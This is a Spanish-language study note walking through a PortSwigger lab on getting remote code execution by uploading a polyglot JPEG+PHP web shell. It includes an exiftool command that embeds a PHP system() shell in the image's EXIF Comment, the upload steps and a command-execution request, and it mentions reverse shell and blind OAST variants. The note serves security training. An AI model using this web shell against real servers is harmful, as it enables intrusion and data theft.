---
aliases:
  - File Upload 004 - polyglot JPEG+PHP
  - polyglot web shell rce exiftool
tags:
  - vuln/file-upload
  - example
  - portswigger
---

# 004 — Polyglot JPEG+PHP (valida el contenido)

> Lab: RCE via polyglot web shell upload · **Practitioner** · técnica → [[vulnerabilities/017-file-upload-vulnerabilities/file-upload-vulnerabilities|entry point]]

## ¿Por qué acá? (valida el contenido, no solo la extensión)
- El server ahora **verifica que sea una imagen de verdad** (magic bytes `FF D8 FF`, dimensiones…). Un `.php` con cuerpo PHP pelado no pasa.
- **La idea:** un **polyglot** = fichero que es **JPEG válido Y PHP** a la vez. Metés el PHP en el metadato `Comment` del JPEG con ExifTool → pasa la validación de contenido y, al servirse como PHP, ejecuta.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = host del lab + el **payload PHP** dentro del Comment + el comando (`?cmd=`).

**Paso 1 — construir el polyglot** con ExifTool (script [[vulnerabilities/017-file-upload-vulnerabilities/polyglot-web-shell-rce/build_polyglot.py]]):
<pre class="payload"><code>exiftool -Comment="<mark>&lt;?php echo system($_GET['cmd']); ?&gt;</mark>" -overwrite_original base.jpg
# guardá el resultado como exploit.php (sigue siendo un JPEG válido + PHP)</code></pre>
**Paso 2 — subir el polyglot** con nombre `.php` por el form de avatar (pasa la validación de imagen).
**Paso 3 — ejecutar** (ojo: el parámetro es `cmd`):
<pre class="payload"><code>GET /files/avatars/exploit.php?cmd=<mark>cat%20/home/carlos/secret</mark> HTTP/1.1
Host: <mark>LAB-ID.web-security-academy.net</mark></code></pre>

## Verificación
La subida se acepta (es un JPEG legítimo) y el GET con `?cmd=` devuelve el **secreto** → *Submit solution*.

## Detalles que se pasan por alto
- El PHP va en el **`Comment`** del EXIF, no al principio del fichero: la cabecera JPEG real (`FF D8 FF`) queda intacta y pasa el chequeo de magic bytes.
- El parámetro es **`cmd`** (no `command`), porque así lo define el payload del script.
- El mismo `build_polyglot.py` trae variantes de payload: lector directo (`file_get_contents`), reverse shell y **OAST/DNS** para RCE ciego.

→ Vuelta al [[vulnerabilities/017-file-upload-vulnerabilities/file-upload-vulnerabilities|entry point]] · resto de bypasses (doble extensión, NULL byte, path traversal, race condition).
